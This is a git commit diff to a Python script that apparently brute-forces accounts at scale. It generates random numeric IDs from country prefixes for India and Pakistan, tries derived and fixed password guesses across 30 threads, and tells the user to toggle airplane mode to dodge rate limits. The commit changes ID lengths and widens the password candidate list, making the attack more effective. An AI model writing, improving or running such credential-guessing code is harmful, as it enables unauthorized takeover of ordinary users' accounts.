193c0e4b879f5f446254280a3e1fd28f1054ec5d
DESTROYED-TESTER <168154763+DESTROYED-TESTER@users.noreply.github.com>
2024-08-04 20:10:06 +0530

    Update file.py

--- file.py
+++ file.py
@@ -917,7 +917,7 @@ def RANDOM():
   else:
       mtd.append('m1')
   for nmbr in range(limit):
-    nmp = ''.join(random.choice(string.digits) for _ in range(5))
+    nmp = ''.join(random.choice(string.digits) for _ in range(6))
     user.append(nmp)
   with tred(max_workers=30) as king_xd:
     os.system('clear')
@@ -925,7 +925,7 @@ def RANDOM():
     ____banner____();print(f'{dot}YOUR CITY{RED}   : {YELLOW}'+current_city);print(f'{dot}METHOD{RED}      : {faltu}{black}RANDOM{pvt}');print(f'{dot}TOTAL LIMIT{RED} : {H}{tl}');print(f'{dot}TURN ON/OFF AIRPLANE MODE {rong}✈{rong2}✈{rong3}✈{rong4}✈{rong5}✈{rong6}✈{rong7}✈' );print(led)
     for guru in user:
       ids = kode+guru
-      pwv = [ids[:6],'57273200',ids[:8],'59039200',ids,'57575751','57575752']
+      pwv = [ids[:6],ids[:8],ids,ids[2:],ids[4:],'57273200','59039200','57575751','57575752']
       if 'm1' in mtd:king_xd.submit(m1,ids,pwv)
       elif 'm2' in mtd:king_xd.submit(m2,ids,pwv)
       elif 'm3' in mtd:king_xd.submit(m3,ids,pwv)
@@ -965,7 +965,7 @@ def INDIA():
   else:
       mtd.append('m1')
   for nmbr in range(limit):
-    nmp = ''.join(random.choice(string.digits) for _ in range(6))
+    nmp = ''.join(random.choice(string.digits) for _ in range(7))
     user.append(nmp)
   with tred(max_workers=30) as king_xd:
     os.system('clear')
@@ -1013,7 +1013,7 @@ def PAKISTAN():
   else:
       mtd.append('m1')
   for nmbr in range(limit):
-    nmp = ''.join(random.choice(string.digits) for _ in range(7))
+    nmp = ''.join(random.choice(string.digits) for _ in range(5))
     user.append(nmp)
   with tred(max_workers=30) as king_xd:
     os.system('clear')
